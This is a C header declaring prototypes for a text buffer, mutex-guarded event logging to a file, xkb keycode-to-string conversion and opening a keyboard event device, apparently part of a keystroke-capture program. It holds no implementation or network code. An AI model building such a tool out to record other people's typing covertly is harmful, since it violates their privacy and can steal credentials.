#ifndef Utils_H_SENTRY
#define Utils_H_SENTRY

#define BUFFER_CAPACITY 1024

typedef struct {
    char *data;
    size_t size;
    size_t capacity;
} BufferText;

int buffer_text_init(BufferText *buffer);
int buffer_text_add(BufferText *buffer, const char *str, pthread_mutex_t *mutex, FileHandler *fh);
void buffer_text_clear(BufferText *buffer);
int write_or_buffer_event(FileHandler *file, BufferText *buffer, const char *event_str, pthread_mutex_t *mutex);
int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len);
int open_file_event_keyboard(int *fd);

#endif